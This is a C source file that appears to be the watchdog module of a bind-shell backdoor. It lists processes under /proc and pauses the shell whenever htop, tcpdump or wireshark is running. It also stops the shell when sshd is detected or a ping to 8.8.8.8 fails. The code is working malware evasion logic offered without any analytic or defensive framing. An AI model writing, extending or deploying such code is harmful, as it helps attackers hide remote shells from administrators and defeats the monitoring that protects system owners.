#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <dirent.h>
#include <stdatomic.h>
#include <ctype.h>

#include "threads.h"
#include "logger.h"

#define TARGET_PROCESS_COUNT 3
const char *MONITOR_TOOLS[TARGET_PROCESS_COUNT] = {"htop", "tcpdump", "wireshark"};

static int is_monitoring_tool_running()
{
    struct dirent *entry;
    DIR *dir = opendir("/proc");
    if (!dir)
        return 0;

    char path[512], process_name[512];
    int found = 0;

    while ((entry = readdir(dir)) != NULL)
    {
        if (!isdigit(entry->d_name[0]))
            continue;

        snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
        FILE *fp = fopen(path, "r");
        if (!fp)
            continue;

        if (fgets(process_name, sizeof(process_name), fp))
        {
            process_name[strcspn(process_name, "\n")] = 0;

            for (int i = 0; i < TARGET_PROCESS_COUNT; i++)
            {
                if (strcmp(process_name, MONITOR_TOOLS[i]) == 0)
                {
                    found = 1;
                    break;
                }
            }
        }
        fclose(fp);
        if (found)
            break;
    }
    closedir(dir);
    return found;
}

static void causes_to_pause(shared_control_t *control)
{
    if (is_monitoring_tool_running())
    {
        log_to_file("Monitoring tool detected. Pausing bind shell...");
        atomic_store(&control->pause_server, 1);
    }
}

static void causes_to_resume(shared_control_t *control)
{
    if (!is_monitoring_tool_running())
        atomic_store(&control->pause_server, 0);
}

static void causes_to_shutdown(shared_control_t *control)
{
    if (control->exit_status != 0)
        atomic_store(&control->keep_running, 0);

    if (system("pgrep sshd > /dev/null") == 0)
    {
        log_to_file("SSH detected. Shutting down...");
        atomic_store(&control->keep_running, 0);
    }

    if (system("ping -c 1 8.8.8.8 > /dev/null 2>&1") != 0)
    {
        log_to_file("No network detected. Shutting down...");
        atomic_store(&control->keep_running, 0);
    }
}

void *watchdog(void *arg)
{
    shared_control_t *control = (shared_control_t *)arg;

    while (atomic_load(&control->keep_running))
    {
        causes_to_pause(control);
        causes_to_resume(control);
        causes_to_shutdown(control);
        sleep(1);
    }

    log_to_file("Monitor thread exiting...");
    return NULL;
}
